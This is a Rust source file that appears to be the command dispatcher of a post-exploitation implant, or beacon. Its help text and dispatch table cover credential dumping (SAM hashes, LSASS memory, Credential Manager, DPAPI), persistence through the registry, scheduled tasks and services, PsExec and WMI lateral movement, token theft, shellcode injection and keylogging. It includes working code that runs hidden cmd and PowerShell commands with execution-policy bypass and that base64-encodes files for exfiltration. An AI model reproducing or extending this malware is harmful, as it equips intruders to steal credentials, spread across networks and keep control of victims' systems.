pub mod creds;
pub mod inject;
pub mod lateral;
pub mod lsass;
pub mod persist;
pub mod recon;
pub mod token;

use anyhow::Result;

const HELP: &str = "\
── Shell ────────────────────────────────────────────────────
  shell <cmd>          Run via cmd.exe /c (Windows) / sh -c (Linux)
  powershell <cmd>     Run via PowerShell.exe -NoP -W Hidden -C
  psh <cmd>            Alias for powershell

── Filesystem ───────────────────────────────────────────────
  ls [path]            List directory (default: .)
  pwd                  Print working directory
  cd <path>            Change working directory
  download <path>      Read file, return base64 content
  cat <path>           Print text file contents

── Recon ─────────────────────────────────────────────────────
  whoami               Current user / privilege info
  ps                   Process list
  ipconfig             Network interfaces
  portscan <host> <ports>  TCP port scan  e.g. 192.168.1.1 22,80,443

── Credentials ───────────────────────────────────────────────
  hashdump             Dump local SAM hashes (requires SYSTEM)
  minidump <pid>       Dump LSASS memory to file
  creds_vault          Read Windows Credential Manager
  creds_dpapi <path>   Decrypt DPAPI blob

── Persistence ───────────────────────────────────────────────
  reg_persist <name> <path>   HKCU Run key persistence
  schtask <name> <path>       Scheduled task persistence
  service <name> <path>       Windows service persistence

── Lateral Movement ──────────────────────────────────────────
  psexec <host> <cmd>  PsExec-style remote execution
  wmi_exec <host> <cmd> WMI remote execution

── Tokens / Privileges ───────────────────────────────────────
  token_steal <pid>    Steal token from process
  make_token <user> <domain> <pass>  Logon + impersonate
  rev2self             Revert to original token

── Injection ─────────────────────────────────────────────────
  inject <pid> <b64_shellcode>  Inject shellcode into PID
  migrate <pid>                 Migrate beacon to PID

── Agent Control ─────────────────────────────────────────────
  sleep <ms>           Change sleep interval for one cycle
  screenshot           Capture screen (Windows)
  keylog               Start keylogger
  kill                 Terminate agent";

/// Dispatch a command string to the matching post-ex module.
pub async fn dispatch(command: &str, args: &[String]) -> Result<String> {
    match command {
        "help" | "?"  => Ok(HELP.into()),
        "shell"       => shell(args).await,
        "powershell" | "psh" => powershell(args).await,
        "ls"          => recon::ls(args.first().map(|s| s.as_str()).unwrap_or(".")).await,
        "cat"         => cat(args).await,
        "ps"          => recon::ps().await,
        "whoami"      => recon::whoami().await,
        "ipconfig"    => recon::ipconfig().await,
        "portscan"    => recon::portscan(args).await,
        "screenshot"  => recon::screenshot().await,
        "keylog"      => recon::keylog_start().await,
        "inject"      => inject::inject_shellcode(args).await,
        "migrate"     => inject::migrate(args).await,
        "token_steal" => token::steal(args).await,
        "make_token"  => token::make(args).await,
        "rev2self"    => token::rev2self().await,
        "hashdump"    => lsass::hashdump().await,
        "minidump"    => lsass::minidump(args).await,
        "creds_vault" => creds::vault().await,
        "creds_dpapi" => creds::dpapi(args).await,
        "psexec"      => lateral::psexec(args).await,
        "wmi_exec"    => lateral::wmi_exec(args).await,
        "reg_persist" => persist::registry(args).await,
        "schtask"     => persist::schtask(args).await,
        "service"     => persist::service(args).await,
        "upload"      => upload(args).await,
        "download"    => download(args).await,
        "cd"          => {
            if let Some(dir) = args.first() {
                std::env::set_current_dir(dir)?;
            }
            Ok(std::env::current_dir()?.to_string_lossy().into_owned())
        }
        "pwd"         => Ok(std::env::current_dir()?.to_string_lossy().into_owned()),
        "sleep"       => {
            if let Some(ms) = args.first().and_then(|s| s.parse::<u64>().ok()) {
                tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
            }
            Ok("sleep updated".into())
        }
        "kill"        => std::process::exit(0),
        _             => Err(anyhow::anyhow!("unknown command '{command}' — type 'help' for a list")),
    }
}

async fn shell(args: &[String]) -> Result<String> {
    if args.is_empty() { return Err(anyhow::anyhow!("no command")); }
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let out = tokio::process::Command::new("cmd.exe")
            .args(["/c", &args.join(" ")])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output().await?;
        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
        return Ok(format!("{stdout}{stderr}"));
    }
    #[cfg(not(target_os = "windows"))]
    {
        let out = tokio::process::Command::new("sh")
            .args(["-c", &args.join(" ")])
            .output().await?;
        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
        Ok(format!("{stdout}{stderr}"))
    }
}

async fn powershell(args: &[String]) -> Result<String> {
    if args.is_empty() { return Err(anyhow::anyhow!("no command")); }
    let cmd = args.join(" ");
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let out = tokio::process::Command::new("PowerShell.exe")
            .args(["-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-C", &cmd])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output().await?;
        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
        return Ok(format!("{stdout}{stderr}"));
    }
    #[cfg(not(target_os = "windows"))]
    {
        let out = tokio::process::Command::new("sh")
            .args(["-c", &cmd])
            .output().await?;
        let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
        let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
        Ok(format!("{stdout}{stderr}"))
    }
}

async fn cat(args: &[String]) -> Result<String> {
    if let Some(path) = args.first() {
        let data = tokio::fs::read_to_string(path).await?;
        return Ok(data);
    }
    Err(anyhow::anyhow!("usage: cat <path>"))
}

async fn upload(args: &[String]) -> Result<String> {
    // args[0] = remote path, body comes via a separate file transfer channel
    Ok(format!("upload stub: {:?}", args))
}

async fn download(args: &[String]) -> Result<String> {
    if let Some(path) = args.first() {
        let data = tokio::fs::read(path).await?;
        use base64::Engine as _;
        let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
        return Ok(format!("FILE:{path}:{b64}"));
    }
    Err(anyhow::anyhow!("usage: download <path>"))
}
